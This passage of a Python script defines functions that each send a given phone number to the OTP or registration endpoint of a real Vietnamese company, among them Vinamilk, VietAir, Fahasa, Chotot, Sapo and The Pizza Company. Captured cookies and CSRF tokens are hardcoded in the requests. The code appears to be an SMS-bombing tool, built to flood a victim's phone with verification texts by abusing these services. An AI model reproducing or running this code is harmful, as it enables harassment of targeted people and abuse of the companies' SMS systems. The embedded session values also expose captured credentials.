    # 'cookie': '_gcl_au=1.1.998139933.1720624574; _ga=GA1.1.50287730.1720624578; _fbp=fb.2.1720624579398.521085014509551541; _tt_enable_cookie=1; _ttp=KSqjH4dgnlCZCXFrW8iH9-PBbVv; _gcl_gs=2.1.k1$i1720624593; _gcl_aw=GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE; _hjSessionUser_2067180=eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==; ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa; _hjSession_2067180=eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _clck=1sxln5m%7C2%7Cfni%7C0%7C1652; __cf_bm=lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA; builderSessionId=7b564e5635c64aa4b60d611b650e05b4; sca_fg_codes=[]; avadaIsLogin=; _ga_6NH1HJ4MRS=GS1.1.1721111594.2.1.1721111671.44.0.0; _clsk=1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
    'origin': 'https://new.vinamilk.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://new.vinamilk.com.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = '{"type":"register","phone":"' + phone + '"}'

    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
def air(phone):
    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={phone}'
    
    cookies = {
        '_gcl_au': '1.1.515899722.1720625176',
        '_tt_enable_cookie': '1',
        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
        '_fbp': 'fb.2.1720625180842.882992170348492798',
        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
        '_gid': 'GA1.3.1511312052.1721112193',
        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
        '_ga': 'GA1.1.186819165.1720625180',
        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': referer_url,
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': phone,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data)
def fa(phone):
    cookies = {
    'frontend': '2c83545216a746a78e9359eb6ed27b3d',
    '_ga': 'GA1.1.4630769.1721136088',
    '_gcl_au': '1.1.1971610675.1721136089',
    'frontend_cid': 'zNYnI9BV3h9Li12T',
    '_tt_enable_cookie': '1',
    '_ttp': 'yK0_Sao-5lepXIRR39-6N_UcfI2',
    '_fbp': 'fb.1.1721136099403.449285731186677163',
    '_clck': '1n4uxir%7C2%7Cfni%7C0%7C1658',
    'moe_uuid': '3aa3f66c-847f-4fcc-988c-f4d857f0a073',
    'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D',
    'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    'OPT_IN_SHOWN_TIME': '1721136125365',
    'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    '_clsk': '169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect',
    'SESSION': '%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D',
    '_ga_460L9JMC2G': 'GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'frontend=2c83545216a746a78e9359eb6ed27b3d; _ga=GA1.1.4630769.1721136088; _gcl_au=1.1.1971610675.1721136089; frontend_cid=zNYnI9BV3h9Li12T; _tt_enable_cookie=1; _ttp=yK0_Sao-5lepXIRR39-6N_UcfI2; _fbp=fb.1.1721136099403.449285731186677163; _clck=1n4uxir%7C2%7Cfni%7C0%7C1658; moe_uuid=3aa3f66c-847f-4fcc-988c-f4d857f0a073; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1721136125365; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; _clsk=169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect; SESSION=%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D; _ga_460L9JMC2G=GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
    'origin': 'https://www.fahasa.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-13c9c10c4d525aad8d0528fa3b7fd940-866a99283e198658-01',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
}

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
def sms3(phone):
    headers = {
        'authority': 'kingme.pro',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
        'dnt': '1',
        'origin': 'https://kingme.pro',
        'referer': 'https://kingme.pro/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
    }

    response = requests.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', headers=headers, data=data)
def chotot(phone):
    cookies = {
        'ipqsd': '341942561532813760',
        'device_id_1721542005': 'PG6FXZbjBE-1721542005',
        'ct-idfp': 'ce5d2928-a3c2-5165-88e8-bb4cd213c649',
        '_cfuvid': 'ORpuQ1Ac0n2fXd3xJ.G_iDI2pBJopaKiqt_6RDvSR.Q-1721974830041-0.0.1.1-604800000',
        'cf_clearance': 'rsXXH9bbBRznYM9.JdvJKjnnIkoxUeaxnvszMoz4se4-1721974832-1.0.1.1-H27burCUSc0WWyuAiZi3AcIC8kk7_p1K9dsO3cG7QYWCfh5eXh1fTKAjscFL2EH4UhWZzc4BnbyZgrjTOwTUyQ',
    }

    headers = {
        'authority': 'id.chotot.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'baggage': 'sentry-environment=prod,sentry-release=ct-web-chotot-id%402.0.0,sentry-transaction=%2Fregister%2Fotp,sentry-public_key=a0cf9ad72b214ec5a3264cec648ff179,sentry-trace_id=df6d9c7e225640bfad7e87f097cc4fe9,sentry-sample_rate=0.1',
        'referer': 'https://id.chotot.com/register',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sentry-trace': 'df6d9c7e225640bfad7e87f097cc4fe9-968a246074f5abf4-0',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-nextjs-data': '1',
    }

    params = {
        'phone': phone,
    }

    response = requests.get(
        'https://id.chotot.com/_next/data/aL54km2oo9eriIzv-Ickg/register/otp.json',
        params=params,
        cookies=cookies,
        headers=headers
    )
    

def sapo(phone):
    cookies = {
    '_hjSessionUser_3167213': 'eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_3167213': 'eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    '_gid': 'GA1.2.312311746.1721136107',
    '_fbp': 'fb.1.1721136112829.278874665245209803',
    '_ce.irv': 'new',
    'cebs': '1',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'G_ENABLED_IDPS': 'google',
    'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'lang': 'vi',
    'referral': 'https://accounts.sapo.vn/',
    'landing_page': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'start_time': '07/16/2024 20:50:23',
    '_dc_gtm_UA-66880228-3': '1',
    'pageview': '2',
    '_ga_4NX0F91DEX': 'GS1.2.1721136112.1.1.1721137827.0.0.0',
    'cebsp_': '8',
    '_dc_gtm_UA-66880228-1': '1',
    '_gat_UA-239546923-1': '1',
    '_ga_YNVPPJ8MZP': 'GS1.1.1721136164.1.1.1721137832.50.0.0',
    '_ga': 'GA1.1.1203051188.1721136107',
    '_ga_GECRBQV6JK': 'GS1.1.1721136164.1.1.1721137833.49.0.0',
    '_ga_8956TVT2M3': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
    '_ga_HXMGB9WRVX': 'GS1.1.1721136159.1.1.1721137833.60.0.0',
    '_ga_CDD1S5P7D4': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
    '_ga_Y9YZPDEGP0': 'GS1.1.1721136163.1.1.1721137833.49.0.0',
    '_ga_EBZKH8C7MK': 'GS1.2.1721136166.1.1.1721137833.0.0.0',
    '_ga_P9DPF3E00F': 'GS1.1.1721136112.1.1.1721137846.0.0.0',
    '_ga_8Z6MB85ZM2': 'GS1.1.1721136165.1.1.1721137847.35.0.0',
    '_ce.s': 'v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457',
    '_gcl_au': '1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_hjSessionUser_3167213=eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3167213=eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _gid=GA1.2.312311746.1721136107; _fbp=fb.1.1721136112829.278874665245209803; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; G_ENABLED_IDPS=google; source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; lang=vi; referral=https://accounts.sapo.vn/; landing_page=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; start_time=07/16/2024 20:50:23; _dc_gtm_UA-66880228-3=1; pageview=2; _ga_4NX0F91DEX=GS1.2.1721136112.1.1.1721137827.0.0.0; cebsp_=8; _dc_gtm_UA-66880228-1=1; _gat_UA-239546923-1=1; _ga_YNVPPJ8MZP=GS1.1.1721136164.1.1.1721137832.50.0.0; _ga=GA1.1.1203051188.1721136107; _ga_GECRBQV6JK=GS1.1.1721136164.1.1.1721137833.49.0.0; _ga_8956TVT2M3=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_HXMGB9WRVX=GS1.1.1721136159.1.1.1721137833.60.0.0; _ga_CDD1S5P7D4=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_Y9YZPDEGP0=GS1.1.1721136163.1.1.1721137833.49.0.0; _ga_EBZKH8C7MK=GS1.2.1721136166.1.1.1721137833.0.0.0; _ga_P9DPF3E00F=GS1.1.1721136112.1.1.1721137846.0.0.0; _ga_8Z6MB85ZM2=GS1.1.1721136165.1.1.1721137847.35.0.0; _ce.s=v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457; _gcl_au=1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
    'origin': 'https://www.sapo.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = {
    'phonenumber': phone,
}

    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
def pizza(phone):
   cookies = {
    '_gcl_au': '1.1.637043979.1723269122',
    '_gid': 'GA1.2.850945508.1723269122',
    '_fbp': 'fb.1.1723269122014.876709375172032518',
    '_tt_enable_cookie': '1',
    '_ttp': 'yvdUSZW1FhGPp0WInV0wJe1rO_Y',
    '.Nop.Antiforgery': 'CfDJ8BZF5ThCV2VIt0xp0xKrEonwqLIuIQI_vn0gC9Sn3pdcitBfmsEFfvVneZ4ZxEII9c6W2NHFcuV-Hzr1Hc_Ixh50sQY_77vIAQYb7gT9-f3ll607cqpRi8IojzoRmky3horKgGq5xtP5euU3w-DRGrM',
    '.Nop.Customer': 'a60cd9da-719f-46d7-91c5-21ef65a7e00d',
    '.Nop.TempData': 'CfDJ8BZF5ThCV2VIt0xp0xKrEonGO6ayneR0pptEu7v54FWPlpzKNwVkhNmisk1VgA1Z5_V32nzewVpvWDbTCAvYPWCU_8sXaUC0_5XpgtQKR6dSicFU6CPqT8_DJ5ajBL_c1hW9t9t1ZmYEBbM9nHeAVpfSWNkRecguE9H-4YfxdcIvixnWj95kO9gzAJ20jkIqwQ',
    '_ga': 'GA1.2.109960598.1723269122',
    '_ga_ZN2XYBNP5S': 'GS1.1.1723269121.1.1.1723269224.25.0.0',
}

   headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.637043979.1723269122; _gid=GA1.2.850945508.1723269122; _fbp=fb.1.1723269122014.876709375172032518; _tt_enable_cookie=1; _ttp=yvdUSZW1FhGPp0WInV0wJe1rO_Y; .Nop.Antiforgery=CfDJ8BZF5ThCV2VIt0xp0xKrEonwqLIuIQI_vn0gC9Sn3pdcitBfmsEFfvVneZ4ZxEII9c6W2NHFcuV-Hzr1Hc_Ixh50sQY_77vIAQYb7gT9-f3ll607cqpRi8IojzoRmky3horKgGq5xtP5euU3w-DRGrM; .Nop.Customer=a60cd9da-719f-46d7-91c5-21ef65a7e00d; .Nop.TempData=CfDJ8BZF5ThCV2VIt0xp0xKrEonGO6ayneR0pptEu7v54FWPlpzKNwVkhNmisk1VgA1Z5_V32nzewVpvWDbTCAvYPWCU_8sXaUC0_5XpgtQKR6dSicFU6CPqT8_DJ5ajBL_c1hW9t9t1ZmYEBbM9nHeAVpfSWNkRecguE9H-4YfxdcIvixnWj95kO9gzAJ20jkIqwQ; _ga=GA1.2.109960598.1723269122; _ga_ZN2XYBNP5S=GS1.1.1723269121.1.1.1723269224.25.0.0',
    'Origin': 'https://thepizzacompany.vn',
    'Referer': 'https://thepizzacompany.vn/Otp',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   data = {
    'phone': phone,
    '__RequestVerificationToken': 'CfDJ8BZF5ThCV2VIt0xp0xKrEolDNxiBPSE48b7TNxaa7HVeKioGsNOfJcuFiktW2svL_082dkVyABrhETaYZwSD8C_xRpaat8qQ_1393ZNof83VH1c_Icp87RecpfkBEiHOcFWsMOJsR2P5fCBuxIEP3xI',
}
   response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
def eco(phone):
   cookies = {
    'auth.strategy': 'local',
    '_gcl_au': '1.1.1008279718.1723262677',
    '_gid': 'GA1.3.796370172.1723262678',
    '_gac_UA-89533981-2': '1.1723262707.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    '_ga_K3DCRYGN3N': 'GS1.3.1723262707.1.0.1723262707.0.0.0',
    '_gcl_aw': 'GCL.1723268940.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    '_ga_G9P9P58D5Y': 'GS1.1.1723268939.2.0.1723268939.60.0.0',
    '_gat_UA-89533981-1': '1',
    '_ga': 'GA1.3.1563520536.1723262678',
    '_dc_gtm_UA-91935928-1': '1',
    '__uidac': '0166b6ff4ba30aef0b9895bdf6812185',
    '__adm_upl': 'eyJ0aW1lIjoxNzIzMjY4OTQ0LCJfdXBsIjpudWxsfQ==',
    'dtdz': '4244a287-04b9-5808-a6a3-c3792429ebbb',
    '__iid': '',
    '__iid': '',
    '__su': '0',
    '__su': '0',
    '_fbp': 'fb.2.1723268940190.206556528840159017',
    '_gac_UA-89533981-1': '1.1723268942.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    '_gac_UA-91935928-1': '1.1723268942.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    '_gat_UA-91935928-1': '1',
    '_ga_GEFZP21KYF': 'GS1.3.1723268939.2.0.1723268941.58.0.0',
    '_ga_F8EJ8FPVHZ': 'GS1.1.1723268939.2.0.1723268948.51.0.0',
}

   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': 'auth.strategy=local; _gcl_au=1.1.1008279718.1723262677; _gid=GA1.3.796370172.1723262678; _gac_UA-89533981-2=1.1723262707.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE; _ga_K3DCRYGN3N=GS1.3.1723262707.1.0.1723262707.0.0.0; _gcl_aw=GCL.1723268940.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE; _ga_G9P9P58D5Y=GS1.1.1723268939.2.0.1723268939.60.0.0; _gat_UA-89533981-1=1; _ga=GA1.3.1563520536.1723262678; _dc_gtm_UA-91935928-1=1; __uidac=0166b6ff4ba30aef0b9895bdf6812185; __adm_upl=eyJ0aW1lIjoxNzIzMjY4OTQ0LCJfdXBsIjpudWxsfQ==; dtdz=4244a287-04b9-5808-a6a3-c3792429ebbb; __iid=; __iid=; __su=0; __su=0; _fbp=fb.2.1723268940190.206556528840159017; _gac_UA-89533981-1=1.1723268942.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE; _gac_UA-91935928-1=1.1723268942.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE; _gat_UA-91935928-1=1; _ga_GEFZP21KYF=GS1.3.1723268939.2.0.1723268941.58.0.0; _ga_F8EJ8FPVHZ=GS1.1.1723268939.2.0.1723268948.51.0.0',
    'csrf-secret': 'bRLY11A79M7jv6Nm5QUktZB5',
    'csrf-token': '6mKzYXmf-pCdEjf1DW4FwS0d0sIjIEQxCfHzKR3SKYc-WbO5zYhQ',
    'origin': 'https://ecogreen.com.vn',
    'priority': 'u=1, i',
    'referer': 'https://ecogreen.com.vn/?gclid=CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'phone': phone,
}

   response = requests.post('https://ecogreen.com.vn/api/auth/register/send-otp', cookies=cookies, headers=headers, json=json_data)
def mego(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://www.medigoapp.com',
    'priority': 'u=1, i',
    'referer': 'https://www.medigoapp.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
